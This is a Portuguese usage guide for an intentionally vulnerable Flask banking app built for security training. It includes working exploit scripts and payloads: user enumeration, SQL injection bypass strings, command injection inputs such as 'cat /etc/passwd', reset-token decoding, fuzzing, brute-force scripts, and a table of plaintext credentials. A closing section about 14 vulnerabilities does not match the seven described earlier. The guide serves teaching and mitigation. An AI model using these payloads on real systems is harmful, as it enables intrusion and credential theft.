# GUIA DE USO - BANCO DIGITAL GRANA FÁCIL

## ⚠️ DISCLAIMER
Ambiente de treinamento com vulnerabilidades INTENCIONAIS.
- Use APENAS em ambiente local
- NUNCA exponha à internet
- NUNCA use em produção

## 📋 REQUISITOS

- Python 3.7+
- pip (gerenciador de pacotes)

## 🚀 INSTALAÇÃO E EXECUÇÃO

### 1. Instalar dependências:
```bash
pip install -r requirements.txt
```

### 2. Executar o aplicativo:
```bash
python vulnerable_app.py
```

### 3. Acessar no navegador:
```
http://127.0.0.1:5000
http://[SEU_IP_LOCAL]:5000  # Para acesso na rede local
```

## 🎯 VULNERABILIDADES IMPLEMENTADAS

### 1. ENUMERAÇÃO DE USUÁRIOS
**Descrição:** Diferenças sutis nas mensagens revelam se usuário existe.

**Como explorar:**
- Usuário EXISTE: "Usuário ou senha incorretos!"
- Usuário NÃO EXISTE: "Usuário ou senha incorretos"
- Observe o ponto de exclamação!

**Exemplo de script:**
```python
import requests

usuarios = ['admin', 'root', 'teste', 'maria']
url = 'http://127.0.0.1:5000/login'

for user in usuarios:
    data = {'username': user, 'password': 'qualquer'}
    resp = requests.post(url, data=data)
    
    if 'incorretos!' in resp.text:
        print(f"[+] Usuário existe: {user}")
    else:
        print(f"[-] Não existe: {user}")
```

---

### 2. SQL INJECTION (Error-Based)
**Descrição:** Campo de senha vulnerável a injeção SQL direta.

**Como explorar:**

**Payloads de teste:**
```sql
' OR '1'='1
' OR '1'='1' --
' OR 1=1 --
admin' --
' UNION SELECT NULL--
```

**Bypass de autenticação:**
```
Usuário: admin
Senha: ' OR '1'='1' --
```

**Ferramentas:**
- SQLMap: `sqlmap -u "http://127.0.0.1:5000/login" --data="username=admin&password=test" --level=5 --risk=3`
- Burp Suite com Intruder
- Scripts Python customizados

**Impacto:** Autenticação completamente contornada!

---

### 3. COMMAND INJECTION
**Descrição:** Botão de suporte executa comandos do sistema diretamente.

**Como explorar:**

1. Clique no botão "💬" no canto inferior direito
2. Digite comandos do sistema
3. Clique em "Enviar"

**Comandos de teste (Linux/Windows):**
```bash
whoami
pwd
date
hostname
echo "Teste"
ping -c 2 127.0.0.1
ls -la
cat /etc/passwd  # Linux
dir C:\          # Windows
```

**Comandos avançados:**
```bash
id
uname -a
env
ps aux
netstat -an
```

**Impacto:** Execução remota de código (RCE) - CRÍTICO!

---

### 4. TOKEN DE RESET PREVISÍVEL
**Descrição:** Token baseado na senha antiga usando ROT13 + Base64.

**Como explorar:**

1. Acesse: http://127.0.0.1:5000/reset
2. Solicite reset para um usuário (ex: `admin`)
3. Copie o token gerado
4. Decodifique com CyberChef ou Python

**CyberChef Recipe:**
```
From_Base64('A-Za-z0-9+/=',true,false)
ROT13(true,true,false,13)
```

**Script Python:**
```python
import base64

token = "SEU_TOKEN_AQUI"
decoded_b64 = base64.b64decode(token).decode()

# ROT13
password = ''
for char in decoded_b64:
    if char.isalpha():
        if char.islower():
            password += chr((ord(char) - ord('a') + 13) % 26 + ord('a'))
        else:
            password += chr((ord(char) - ord('A') + 13) % 26 + ord('A'))
    else:
        password += char

print(f"Senha descoberta: {password}")
```

**Desafio:** O sistema pede o valor oculto no token para confirmar o reset!

**Impacto:** Qualquer pessoa pode descobrir senhas através do reset!

---

### 5. PÁGINA OCULTA SEM AUTENTICAÇÃO
**Descrição:** Página `/admin1` acessível sem login.

**Como descobrir:**

**Gobuster:**
```bash
gobuster dir -u http://127.0.0.1:5000 -w /usr/share/wordlists/dirb/common.txt
```

**Dirsearch:**
```bash
dirsearch -u http://127.0.0.1:5000
```

**ffuf:**
```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://127.0.0.1:5000/FUZZ
```

**Script Python:**
```python
import requests

wordlist = ['admin', 'admin1', 'admin2', 'panel', 'secret']

for word in wordlist:
    url = f'http://127.0.0.1:5000/{word}'
    if requests.get(url).status_code == 200:
        print(f"[+] Encontrado: {url}")
```

**URL:** http://127.0.0.1:5000/admin1

---

### 6. SENHAS EM TEXTO CLARO NO BANCO
**Descrição:** Banco SQLite armazena senhas sem criptografia.

**Como explorar:**

```bash
# Instalar sqlite3 (geralmente já vem instalado)
sqlite3 banco_digital.db

# Dentro do sqlite3:
SELECT * FROM usuarios;
.exit
```

**Ou com Python:**
```python
import sqlite3

conn = sqlite3.connect('banco_digital.db')
cursor = conn.cursor()
cursor.execute("SELECT username, password FROM usuarios")

for user, pwd in cursor.fetchall():
    print(f"[+] {user}: {pwd}")

conn.close()
```

**Impacto:** Todas as credenciais expostas se o atacante acessar o banco!

---

### 7. SEM PROTEÇÕES DE FORÇA BRUTA
**Descrição:** Sem CAPTCHA, Rate Limiting ou MFA.

**Como explorar:**

**Hydra:**
```bash
hydra -l admin -P rockyou.txt 127.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:incorretos" -s 5000
```

**Script Python:**
```python
import requests

username = 'maria'
wordlist = open('rockyou.txt').read().splitlines()

for senha in wordlist[:1000]:  # Testa 1000 primeiras
    data = {'username': username, 'password': senha}
    resp = requests.post('http://127.0.0.1:5000/login', data=data)
    
    if 'Acesso Autorizado' in resp.text:
        print(f"[+] SENHA: {senha}")
        break
```

---

## 👥 CREDENCIAIS DISPONÍVEIS

| Usuário | Senha |
|---------|-------|
| admin | senhaForte123! |
| root | P@ssw0rd2024! |
| usuario1 | senha123 |
| maria | maria2020 |
| john | john456 |

## 🛠️ FERRAMENTAS RECOMENDADAS

### Reconhecimento:
- Nmap
- Nikto
- WhatWeb

### Exploração:
- Burp Suite Community
- OWASP ZAP
- SQLMap
- CyberChef
- Gobuster / Dirsearch
- Hydra / Medusa

### Análise:
- Wireshark
- tcpdump
- Browser Developer Tools

## 📚 EXERCÍCIOS PRÁTICOS

### Exercício 1: Enumeração (Fácil)
**Objetivo:** Descobrir todos os 5 usuários válidos
**Dica:** Compare as mensagens de erro

### Exercício 2: SQL Injection (Médio)
**Objetivo:** Fazer login como admin usando SQLi
**Dica:** Tente payloads de bypass de autenticação

### Exercício 3: Command Injection (Médio)
**Objetivo:** Executar `whoami` e `pwd`
**Dica:** Use o botão de suporte

### Exercício 4: Token de Reset (Médio)
**Objetivo:** Descobrir a senha do usuário `admin`
**Dica:** Base64 → ROT13

### Exercício 5: Fuzzing (Fácil)
**Objetivo:** Encontrar a página `/admin1`
**Dica:** Use wordlist comum

### Exercício 6: Database (Difícil)
**Objetivo:** Extrair todas as senhas do banco
**Dica:** SQLite3 ou Python

### Exercício 7: Brute Force (Médio)
**Objetivo:** Descobrir senha de `maria`
**Dica:** Senha está na rockyou.txt

## 🔒 MITIGAÇÕES

### Enumeração:
```python
# Mensagens genéricas idênticas
return "Credenciais inválidas"
```

### SQL Injection:
```python
# Prepared statements
query = "SELECT * FROM usuarios WHERE username=? AND password=?"
result = db.execute(query, [username, password])
```

### Command Injection:
```python
# NUNCA use shell=True
# Valide e sanitize inputs
# Use whitelist de comandos permitidos
```

### Token de Reset:
```python
import secrets
token = secrets.token_urlsafe(32)
# Salvar em banco com expiração
```

### Página Oculta:
```python
@login_required
def admin():
    # Sempre exigir autenticação
```

### Senhas no Banco:
```python
from werkzeug.security import generate_password_hash
hashed = generate_password_hash(password)
```

### Rate Limiting:
```python
from flask_limiter import Limiter
limiter = Limiter(app)

@app.route('/login')
@limiter.limit("5/minute")
def login():
    pass
```

## 🐛 TROUBLESHOOTING

### Erro: "Address already in use"
```bash
# Linux/Mac
lsof -i :5000
kill -9 <PID>

# Windows
netstat -ano | findstr :5000
taskkill /PID <PID> /F
```

### Erro: "ModuleNotFoundError"
```bash
pip install --upgrade -r requirements.txt
```

### Banco não inicializa
```bash
rm banco_digital.db
python vulnerable_app.py
```

## 📊 RESUMO DAS VULNERABILIDADES

| # | Vulnerabilidade | Severidade | OWASP Top 10 |
|---|----------------|-----------|--------------|
| 1 | Enumeração de Usuários | Média | A01:2021 |
| 2 | SQL Injection | CRÍTICA | A03:2021 |
| 3 | Command Injection | CRÍTICA | A03:2021 |
| 4 | Token Previsível | Alta | A02:2021 |
| 5 | Página sem Auth | Alta | A01:2021 |
| 6 | Senhas em Texto Claro | CRÍTICA | A02:2021 |
| 7 | Sem Rate Limiting | Média | A07:2021 |

## 🎓 RECOMENDAÇÕES DIDÁTICAS

### Para Instrutores:
1. Demonstre cada vulnerabilidade individualmente
2. Deixe os alunos explorarem sozinhos
3. Discuta impactos reais de cada falha
4. Ensine as mitigações corretas
5. Compare com casos reais do OWASP

### Progressão Sugerida:
1. Enumeração (básico)
2. Fuzzing (básico)
3. Token de Reset (intermediário)
4. SQL Injection (intermediário/avançado)
5. Command Injection (avançado)
6. Análise do banco (avançado)
7. Brute Force (intermediário)

---

**Versão:** 2.0
**Última atualização:** 2025-01-30
**Licença:** Apenas para fins educacionais

---

## 📊 Resumo das 14 Vulnerabilidades

### Distribuição por Severidade:

| Severidade | Quantidade | Percentual |
|------------|-----------|-----------|
| CRÍTICA | 4 | 29% |
| ALTA | 4 | 29% |
| MÉDIA | 5 | 36% |
| BAIXA | 1 | 7% |

### ⚠️ VULN-09 foi RECLASSIFICADA:
- **Antes:** MÉDIA (CVSS 5.3)
- **Agora:** **ALTA (CVSS 8.6)** ⬆️
- **Motivo:** Permite Account Takeover em massa via força bruta

---

## 🎯 Ataques Encadeados

### Ataque 1: Enumeração + Força Bruta
```
VULN-07 (Enumeração) → Identifica usuários válidos
        ↓
VULN-09 (Sem CAPTCHA) → Força bruta automatizada
        ↓
Account Takeover de 30-40% das contas
```

### Ataque 2: SQLi + Exfiltração
```
VULN-01 (SQL Injection) → Acessa banco de dados
        ↓
VULN-03 (Senhas em texto claro) → Exfiltra TODAS as credenciais
```

### Ataque 3: Fuzzing + Credenciais
```
VULN-05 (Página sem auth) → Descobre /admin1
        ↓
VULN-14 (Credenciais expostas) → Acessa infraestrutura
```

---

## 🔒 Prioridades de Correção

### URGENTE (Esta Semana):
1. ✅ VULN-02: Remover botão de suporte (RCE)
2. ✅ VULN-01: Prepared statements (SQLi)
3. ✅ VULN-03: Hash de senhas (bcrypt)
4. ✅ VULN-14: Remover credenciais + rotacionar

### ALTA (Este Mês):
5. ✅ **VULN-09: Implementar reCAPTCHA** ⭐
6. ✅ VULN-06: Implementar HTTPS
7. ✅ VULN-05: Autenticação em /admin1
8. ✅ VULN-04: Tokens seguros

### MÉDIA (3 Meses):
9-13. VULN-10, 08, 07, 11, 12

### BAIXA (6 Meses):
14. VULN-13: Logging e SIEM

